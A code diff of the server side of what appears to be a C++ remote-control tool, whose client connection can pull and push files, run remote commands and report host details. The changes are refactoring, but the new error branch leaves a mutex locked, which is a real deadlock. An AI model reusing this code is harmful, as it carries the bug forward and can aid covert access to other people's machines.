@@ -16,15 +16,16 @@
 */
 class connection{
 private:
+    logWindow* servLogWin = nullptr; // Pointer to the log window
     std::mutex sockFdMutex; // Only one thread can use the socket file descriptor at a time
-    bool lastConnectivityCheck = false; // Last result of the connectivity check
+    std::string msgToSend = ""; // This will be derived from the input buffer
+    const unsigned int inputBufferSize = 4096; // Size of the input buffer - could probably get rid of this dumb variable
+    char inputBuffer[4096] = {0}; // Used for the text input box
+    unsigned int cmdHistSelected = 0;
     std::vector<std::string> plainTextMessageHistory; // Elements of this vector are displayed in the terminal
     std::vector<std::string> commandHistory; // Stores a list of previously sent commands
-    unsigned int cmdHistSelected = 0;
-    char inputBuffer[1024] = {0}; // Used for the text input box
-    const unsigned int inputBufferSize = 1024; // Size of the input buffer - could probably get rid of this dumb variable
-    std::string msgToSend = ""; // This will be derived from the input buffer
-    logWindow* servLogWin = nullptr; // Pointer to the log window
+    
+
 
     /*
         Reads all the data from the socket (flushes the socket)
@@ -33,7 +34,7 @@ private:
     void flushSocket(){
         this->sockFdMutex.lock();
         char buffer[1024] = {0};
-        int flags = fcntl(this->sockFd, F_GETFL, 0);
+        int flags = fcntl(this->sockFd, F_GETFL, 0); // Save the flags so they can be restored later
         fcntl(this->sockFd, F_SETFL, flags | O_NONBLOCK);
         int bytesReceived = 0;
         do{
@@ -85,10 +86,10 @@ private:
         }
     }
 
-
     /*
         genericCmd is used for very basic commands that dont require any special handling on the server side
         Response from client: <cmd>;<response>
+        Response size is limited to 4096
     */
     void genericCmd(std::string cmd){
         this->servLogWin->add("connection::genericCmd() - INFO: Called with cmd: " + cmd);
@@ -117,15 +118,16 @@ private:
 
         // Parse the response and append it to the message history:
         std::string cmdRecvBufferString = std::string(cmdRecvBuffer); // Convert to a string for easier parsing
-        if(!cmdRecvBufferString.starts_with(cmd)){
+        if(cmdRecvBufferString.starts_with(cmd)){ // Protocol requires that the cmd sent is sent back in the response
+            this->plainTextMessageHistory.push_back(cmdRecvBufferString.substr(cmd.length(), cmdRecvBufferString.length() - cmd.length() - 1)); // Extract just the <response> from "<cmd>;<response>;"
+            this->servLogWin->add("connection::genericCmd() - INFO: Response received and appended to message history");
+            this->sockFdMutex.unlock();
+        }else{
             this->servLogWin->add("connection::genericCmd() - WARN: Received an unexpected response from the client");
-            this->plainTextMessageHistory.push_back("WARN: Received an unexpected response from the client");
+            this->plainTextMessageHistory.push_back("WARN: Received an unexpected response from the client:");
+            this->plainTextMessageHistory.push_back(cmdRecvBufferString);
         }
-        this->plainTextMessageHistory.push_back(cmdRecvBufferString.substr(cmd.length(), cmdRecvBufferString.length() - cmd.length() - 1)); // Extract just the <response> from "<cmd>;<response>;"
-        this->servLogWin->add("connection::genericCmd() - INFO: Response received and appended to message history");
-        this->sockFdMutex.unlock();
     }
-
 
     /*
         Grab a file from the client
@@ -205,7 +207,6 @@ private:
         this->sockFdMutex.unlock();
     }
 
-
     /*
         Upload a file to the client
         The request to the client will be in the format:
@@ -257,7 +258,6 @@ private:
             this->sockFdMutex.unlock();
         }
     }
-
 
     /*
         Executes a command on the client via _popen()
@@ -338,6 +338,7 @@ private:
         this->servLogWin->add("connection::exec() - INFO: Response received and added to message history successfully");
         this->sockFdMutex.unlock();
     }
+
 
 
 public:
@@ -479,7 +480,6 @@ public:
         return true;
     }
 
-
     /*
         Draws terminal window if it is active
         Also processes any commands that need to be sent
@@ -494,7 +494,6 @@ public:
         this->flushSocket(); // Clear out the recv buffer
     }
 
-
     /*
         This function is called by a separate thread every <n> seconds to check if the connection is still alive
         The function which calls this function checks that this->terminalActive is false before calling this function (dont ping a terminal that is being used)
@@ -504,21 +503,17 @@ public:
         int bytesSent = send(this->sockFd, "ping;", 5, 0);
         if(bytesSent != 5){
             this->sockFdMutex.unlock();
-            this->lastConnectivityCheck = false;
             return false;
         }
         char buffer[10] = {0};
         int bytesReceived = recv(this->sockFd, buffer, 10, 0);
         if(std::string(buffer) != "ping;pong;"){
             this->sockFdMutex.unlock();
-            this->lastConnectivityCheck = false;
             return false;
         }
         this->sockFdMutex.unlock();
-        this->lastConnectivityCheck = true;
         return true;
     }
-
 
     /*
         Draws a window with some info about the connection
@@ -531,10 +526,8 @@ public:
         ImGui::Text("Username: %s", this->username.c_str());
         ImGui::Text("Hostname: %s", this->hostname.c_str());
         ImGui::Text("Public IP: %s", this->publicIp.c_str());
-        ImGui::Text("Connectivity: %s", (this->lastConnectivityCheck)?"OK":"ERR");
         ImGui::End();
     }
-
 
     /*
         The purpose of closeTerminal() is to set this->terminalActive to false and flush the socket
@@ -545,5 +538,5 @@ public:
         this->terminalActive = false;
         this->flushSocket();
     }
-    
+
 };
